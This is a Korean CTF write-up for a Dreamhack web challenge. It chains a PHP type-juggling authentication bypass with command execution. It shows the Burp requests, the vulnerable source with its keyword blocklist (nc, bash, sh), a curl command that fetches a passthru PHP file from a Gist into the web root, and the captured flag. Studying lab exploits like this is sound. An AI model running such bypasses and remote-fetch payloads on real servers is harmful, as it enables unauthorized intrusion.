# Dreamhack S4 — Switching Command 풀이

&#x20;해결 완료

분야: Web · PHP Type Juggling · Command Execution

핵심: `index.php`의 PHP 타입 비교 취약점으로 관리자 세션을 획득한 뒤, `test.php`의 명령 실행 기능을 이용하여 `run.php`를 내려받고 `/flag` 실행 결과를 확인하는 문제다.

업로드한 ZIP의 실제 소스코드와 지금까지 진행한 Burp Suite 요청 흐름을 기준으로 정리했다.

## 1. 전체 공격 흐름

index.php

JSON 입력값을 느슨하게 비교해 관리자 인증 분기로 진입

config.php

session_start()로 PHP 세션 생성·유지

test.php

관리자 세션 확인 후 cmd 파라미터의 명령 실행

run.php

Gist에서 가져온 PHP 파일을 서버에서 실행

/flag

flag.c를 컴파일해 만든 실행 파일의 출력 확인

## 2. index.php — 관리자 인증 우회

### 취약한 코드
```
$data = json_decode($_POST["username"]);

if ($data === null) {
    exit("Failed to parse JSON data");
}

$username = $data->username;

if ($username === "admin") {
    exit("no hack");
}

switch ($username) {
    case "admin":
        $user = "admin";
        $password = "***REDACTED***";

        $stmt = $conn->prepare(
            "SELECT * FROM users WHERE username = ? AND password = ?"
        );
        $stmt->bind_param("ss", $user, $password);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows == 1) {
            $_SESSION["auth"] = "admin";
            header("Location: test.php");
        }
        break;

    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
```

여기서 중요한 부분은 `===`와 `switch`의 비교 방식 차이야.
```
var_dump(true === "admin"); // false
var_dump(true == "admin");  // true
```

PHP 8에서 Boolean `true`는 느슨한 비교 시 비어 있지 않은 문자열과 같다고 판단될 수 있어.

따라서 JSON의 Boolean 값을 이용한다.
```
{"username":true}
```

### 실제 Burp Repeater 요청
```
POST /index.php HTTP/1.1
Host: host3.dreamhack.games:21271
Content-Type: application/x-www-form-urlencoded
Connection: close

username=%7B%22username%22%3Atrue%7D
```

URL 인코딩된 값은 다음과 같아.
```
%7B  → {
%22 → "
%3A  → :
%7D  → }
```

### 서버 내부 실행 과정

`json_decode()` 실행

JSON 객체 생성

`$username === "admin"`

false

`switch($username)` → `case "admin"`

일치

DB 조회 결과 1건

Admin 세션 생성

`deploy/mysql_init/init.sql`에는 `admin` 계정이 등록되어 있고, `index.php`는 입력한 Boolean이 아닌 코드에 고정된 `$user`와 `$password`로 데이터베이스를 조회해.

조회 결과가 1건이면 다음 코드가 실행돼.
```
$_SESSION["auth"] = "admin";
header("Location: test.php");
```

이때 Burp에서 확인했던 응답:
```
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
Location: test.php
```

`PHPSESSID`는 이후 요청에 포함해 동일한 인증 세션을 유지한다.

참고로 302 응답 자체는 관리자 인증의 확정 근거가 아니야. Guest 분기도 302를 반환하기 때문이야.

## 3. test.php — 관리자 명령 실행

다음은 ZIP에 들어 있던 `deploy/src/test.php`의 핵심 코드야.
```
include("./config.php");

$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if ($_SESSION["auth"] === "admin") {

    $command = isset($_GET["cmd"])
        ? $_GET["cmd"]
        : "ls";

    $sanitized_command = str_replace("\n", "", $command);

    if (preg_match($pattern, $sanitized_command)) {
        exit("No hack");
    }

    $resulttt = shell_exec(
        escapeshellcmd($sanitized_command)
    );
}
else if ($_SESSION["auth"] === "guest") {

    $command = "echo hi guest";
    $result = shell_exec($command);

}
else {
    $result = "Authentication first";
}
```

### 코드 분석

- `$_SESSION["auth"] === "admin"`: 관리자 세션인지 확인
- `$_GET["cmd"]`: URL의 `cmd` 파라미터를 명령어로 사용
- `str_replace("\n", "", $command)`: 줄바꿈 문자 제거
- `preg_match($pattern, ...)`: `flag`, `bash`, `sh` 등의 단어를 차단
- `escapeshellcmd()`: 셸 특수문자 일부를 이스케이프
- `shell_exec()`: 최종 명령 실행

여기에 명령 실행 결과를 표시하지 못하는 코드 오류도 있어.
```
$resulttt = shell_exec(...);
```

실제로 HTML에서 출력하는 변수는:
```
echo "<pre>$result</pre>";
```

즉, `$resulttt`와 `$result`가 서로 달라서 관리자 명령의 실행 결과가 화면에 나타나지 않는 거야.

우리가 Burp에서 `Command Test`만 보거나 아무 출력도 확인하지 못했던 이유 중 하나가 이 부분이야.

## 4. run.php — 명령 실행 결과 확인

`test.php`에서 직접 `/flag`를 실행하려고 하면 정규표현식이 `flag` 문자열을 차단해.

그래서 실습에서는 PHP 파일을 별도로 준비했어.

GitHub Gist에 생성한 파일 이름:

`run.php`

파일 내용:
```
<?php
passthru('/flag');
?>
```

`passthru()`는 외부 프로그램을 실행하고 출력을 직접 전달하는 PHP 함수야.

### 왜 /flag를 실행해야 할까?

첨부된 `Dockerfile`을 보면:
```
COPY ./flag.c /flag.c

RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c
```

`flag.c`를 GCC로 컴파일해서 `/flag` 실행 파일을 생성하고 실행 권한을 부여해.

따라서 `/flag`는 일반적인 텍스트 파일이 아니라 실행 파일이야.

참고로 ZIP에 들어 있는 `flag.c`에는 가짜 플래그 출력 코드가 있으며, 실제 문제 서버에서는 다른 플래그가 출력되었어.

## 5. GitHub Gist에서 run.php 가져오기

우리가 사용한 Gist Raw URL:
```
https://gist.githubusercontent.com/myhtml1231-star/1782817ec026490b75c425a742f53c8a/raw/d465571a999d0c87a875fc83cbb8f550da074923/run.php
```

관리자 세션으로 `test.php`의 `cmd` 파라미터에 `curl` 명령을 전달하는 방식이야.

명령 형태:
```
curl -fsSL "GIST_RAW_URL" -o run.php
```

- `-f`: HTTP 오류 시 실패 처리
- `-s`: 진행 메시지 숨김
- `-S`: 오류 메시지는 표시
- `-L`: 리다이렉트 따라가기
- `-o run.php`: 내려받은 내용을 `run.php` 파일로 저장

### Burp 요청 구조
```
GET /test.php?cmd=curl%20-fsSL%20GIST_RAW_URL%20-o%20run.php HTTP/1.1
Host: host3.dreamhack.games:21271
Cookie: PHPSESSID=관리자인증된_세션ID
Connection: close
```

실제 요청에서는 `GIST_RAW_URL`에 위에서 생성한 Raw URL을 입력하고 URL에 필요한 문자를 인코딩했어.

핵심은 명령 실행 요청의 `cmd`에 `/flag`를 직접 넣지 않았다는 점이야. `/flag` 실행 코드는 다운로드한 `run.php` 내부에 들어 있으므로 `test.php`의 문자열 필터가 그 PHP 코드 내용을 직접 검사하지 않아.

단, 파일 다운로드와 저장이 가능한지는 서버 환경과 권한에 따라 달라져.

## 6. run.php 실행 및 플래그 획득

`run.php`가 웹 디렉터리에 저장된 상태에서 브라우저로 다음 경로에 접근하는 방식이야.
```
GET /run.php HTTP/1.1
Host: host3.dreamhack.games:21271
Connection: close
```

처리 순서는 다음과 같아.
```
브라우저
   ↓
GET /run.php
   ↓
Apache + PHP
   ↓
run.php 코드 실행
   ↓
passthru('/flag')
   ↓
/flag 실행 파일 실행
   ↓
프로그램 출력이 HTTP 응답으로 전달
```

최종적으로 얻은 플래그:

Dreamhack Flag

DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}

&#x20;복사

## 7. 문제에서 사용된 취약점 정리

|   |
| - |

취약점 또는 문제

|   |
| - |

소스 파일

|   |
| - |

원인

|   |
| - |

PHP Type Juggling

|   |
| - |

`index.php`

|   |
| - |

`===`와 `switch`의 느슨한 비교 차이

|   |
| - |

인증 우회

|   |
| - |

`index.php`

|   |
| - |

Boolean 입력이 관리자 분기와 일치

|   |
| - |

OS Command Execution

|   |
| - |

`test.php`

|   |
| - |

사용자가 지정한 `cmd` 값이 `shell_exec()`로 전달

|   |
| - |

부적절한 명령 필터링

|   |
| - |

`test.php`

|   |
| - |

특정 단어만 차단하는 블랙리스트

|   |
| - |

명령 실행 결과 출력 오류

|   |
| - |

`test.php`

|   |
| - |

`$resulttt`와 `$result` 변수명 불일치

|   |
| - |

별도 PHP를 통한 실행

|   |
| - |

`run.php`

|   |
| - |

`passthru('/flag')` 사용

### 최종 결론

이 문제의 주요 원인은 PHP의 엄격 비교와 느슨한 비교를 혼용한 인증 로직이야.

`index.php`에서 JSON Boolean `true`를 전달하면 `=== "admin"` 비교는 통과하지만, `switch`의 `"admin"` 분기에는 진입할 수 있어. 이후 DB 조회 조건이 충족되면 관리자 세션이 생성돼.

관리자 권한으로 접근한 `test.php`에서는 GET 파라미터 `cmd`로 시스템 명령을 실행할 수 있었고, 단순 블랙리스트가 적용되어 있었어. 실습 과정에서는 `run.php`를 이용해 실행 결과를 웹 응답으로 확인했고 최종 플래그를 획득했어.

정리하면 `PHP Type Juggling → Admin Session → Command Execution → PHP 파일 실행 → Flag 획득` 순서로 해결한 문제야.